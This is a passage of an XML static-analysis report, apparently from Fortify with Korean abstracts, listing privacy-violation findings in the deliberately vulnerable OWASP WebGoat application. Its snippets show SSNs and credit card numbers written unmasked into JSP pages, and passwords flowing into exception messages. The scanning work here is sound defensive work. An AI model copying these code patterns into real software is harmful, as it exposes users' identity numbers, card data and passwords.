                        <Issue iid="DF3A706B74449691852B86E868FBEDF0" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>org.owasp.webgoat.session.Employee.getSsn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C7D5C56270067D75B986F150B0D631E9" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>132</LineStart>
<Snippet>    public String getCcn()
    {
	return ccn;
    }
</Snippet>
<TargetFunction>Read this.ccn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="68A4ECC9435B121BB1272344D6F64BA1" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>66</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>132</LineStart>
<Snippet>    public String getCcn()
    {
	return ccn;
    }
</Snippet>
<TargetFunction>Read this.ccn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="13AE22C88661F95BF75681BE4BF98F12" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterNotFoundException.java의 ParameterNotFoundException() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterNotFoundException.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterNotFoundException.java</FilePath>
<LineStart>54</LineStart>
<Snippet>    public ParameterNotFoundException(String s)
    {
	super(s);
    }
}</Snippet>
<TargetFunction>java.lang.Exception.Exception()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>77</LineStart>
<Snippet>		    RoleBasedAccessControl.LAST_NAME);
	    String ssn = s.getParser().getStringParameter(
		    RoleBasedAccessControl.SSN);
	    String title = s.getParser().getStringParameter(
		    RoleBasedAccessControl.TITLE);</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.RoleBasedAccessControl.RoleBasedAccessControl.SSN()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CBEA43D0DB19D72F041781780F459511" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>58</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>90</LineStart>
<Snippet>	this.firstName = firstName;
	this.lastName = lastName;
	this.ssn = ssn;
	this.title = title;
	this.phone = phone;</Snippet>
<TargetFunction>Read ssn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="767FC201B2B8CC97B04C92814C3D8820" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterNotFoundException.java의 ParameterNotFoundException() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterNotFoundException.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterNotFoundException.java</FilePath>
<LineStart>54</LineStart>
<Snippet>    public ParameterNotFoundException(String s)
    {
	super(s);
    }
}</Snippet>
<TargetFunction>java.lang.Exception.Exception()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>78</LineStart>
<Snippet>		    RoleBasedAccessControl.EMPLOYEE_ID);
	    String password = s.getParser().getStringParameter(
		    RoleBasedAccessControl.PASSWORD);

	    // Attempt authentication</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.RoleBasedAccessControl.RoleBasedAccessControl.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7C4336F35EC5310C33F71FED123FDD72" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>204</LineStart>
<Snippet>    public String getSsn()
    {
	return ssn;
    }
</Snippet>
<TargetFunction>Read this.ssn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CCF6FB905F08BCDAE1AD9CC2C1DAD709" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getRawParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>631</LineStart>
<Snippet>	if (values == null)
	{
	    throw new ParameterNotFoundException(name + " not found");
	}
	else if (values[0].length() == 0)</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DOS_Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DOS_Login.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	    String password = "";
	    username = s.getParser().getRawParameter(USERNAME);
	    password = s.getParser().getRawParameter(PASSWORD);

	    // don;t allow user name from other lessons.  it would be too simple.</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.DOS_Login.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="897296146D605A566ED70010D983382F" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>90</LineStart>
<Snippet>	this.firstName = firstName;
	this.lastName = lastName;
	this.ssn = ssn;
	this.title = title;
	this.phone = phone;</Snippet>
<TargetFunction>Read ssn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="630EC75695BBCF2692E66F044C5E95AE" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>98</LineStart>
<Snippet>	this.startDate = startDate;
	this.salary = salary;
	this.ccn = ccn;
	this.ccnLimit = ccnLimit;
	this.disciplinaryActionDate = disciplinaryActionDate;</Snippet>
<TargetFunction>Read ccn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2A27409B8D196FB8DD248EBCB258A304" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>org.owasp.webgoat.session.Employee.getSsn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A38CF1690ACEAFC6613FA5E00793ABEB" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>53</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>90</LineStart>
<Snippet>	this.firstName = firstName;
	this.lastName = lastName;
	this.ssn = ssn;
	this.title = title;
	this.phone = phone;</Snippet>
<TargetFunction>Read ssn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4663FD29543DC990B07C1AD5A92A1AD5" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getStringParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>695</LineStart>
<Snippet>	if (values == null)
	{
	    throw new ParameterNotFoundException(name + " not found");
	}
	else if (values[0].length() == 0)</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>127</LineStart>
<Snippet>    {
	String username = s.getParser().getStringParameter(USERNAME, "");
	String password = s.getParser().getStringParameter(PASSWORD, "");

	if ((username.length() &gt; 0) &amp;&amp; (password.length() &gt; 0))</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.WeakAuthenticationCookie.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="089FB0E4C27C4DFE845FE47E11FFE34F" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getStringParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>699</LineStart>
<Snippet>	else if (values[0].length() == 0)
	{
	    throw new ParameterNotFoundException(name + " was empty");
	}
	else</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>93</LineStart>
<Snippet>		    RoleBasedAccessControl.SALARY);
	    String ccn = s.getParser().getStringParameter(
		    RoleBasedAccessControl.CCN);
	    int ccnLimit = s.getParser().getIntParameter(
		    RoleBasedAccessControl.CCN_LIMIT);</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.RoleBasedAccessControl.RoleBasedAccessControl.CCN()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="77ACC073AE2008FDA4853206D0F6F3A2" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>58</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>58</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>org.owasp.webgoat.session.Employee.getSsn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9ABB17DF78946503BBCFCD15142FEF15" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>org.owasp.webgoat.session.Employee.getCcn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="31BE6343A0D2F95463E6967907F465AE" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterNotFoundException.java의 ParameterNotFoundException() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterNotFoundException.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterNotFoundException.java</FilePath>
<LineStart>54</LineStart>
<Snippet>    public ParameterNotFoundException(String s)
    {
	super(s);
    }
}</Snippet>
<TargetFunction>java.lang.Exception.Exception()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>FailOpenAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/FailOpenAuthentication.java</FilePath>
<LineStart>73</LineStart>
<Snippet>	    {
		username = s.getParser().getRawParameter(USERNAME);
		password = s.getParser().getRawParameter(PASSWORD);

		// if credentials are bad, send the login page</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.WeakAuthenticationCookie.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="39BD5B82BDC59C2B5279E38B322D35F6" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ParameterParser.java의 getRawParameter() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>635</LineStart>
<Snippet>	else if (values[0].length() == 0)
	{
	    throw new ParameterNotFoundException(name + " was empty");
	}
</Snippet>
<TargetFunction>org.owasp.webgoat.session.ParameterNotFoundException.ParameterNotFoundException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>78</LineStart>
<Snippet>		    SQLInjection.EMPLOYEE_ID);
	    String password = s.getParser().getRawParameter(
		    SQLInjection.PASSWORD);

	    // Attempt authentication</Snippet>
<TargetFunction>Read org.owasp.webgoat.lessons.SQLInjection.SQLInjection.PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6F996D18E740A6F2B96158308DD954FB" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getCcn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>132</LineStart>
<Snippet>    public String getCcn()
    {
	return ccn;
    }
</Snippet>
<TargetFunction>Read this.ccn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="195E3E39264932335DE8245E5BC3AE77" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>53</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>53</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>org.owasp.webgoat.session.Employee.getSsn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E3BC81D72941B22DAA5D38A5AD92CC6F" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>66</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Employee.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Employee.java</FilePath>
<LineStart>98</LineStart>
<Snippet>	this.startDate = startDate;
	this.salary = salary;
	this.ccn = ccn;
	this.ccnLimit = ccnLimit;
	this.disciplinaryActionDate = disciplinaryActionDate;</Snippet>
<TargetFunction>Read ccn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FD1AF7E7FCF4343F50E6871ED36AE66D" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드는 기밀 정보를 잘못 취급합니다. 이는 사용자 개인 정보를 침해할 수 있고 불법인 경우도 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>66</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>66</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
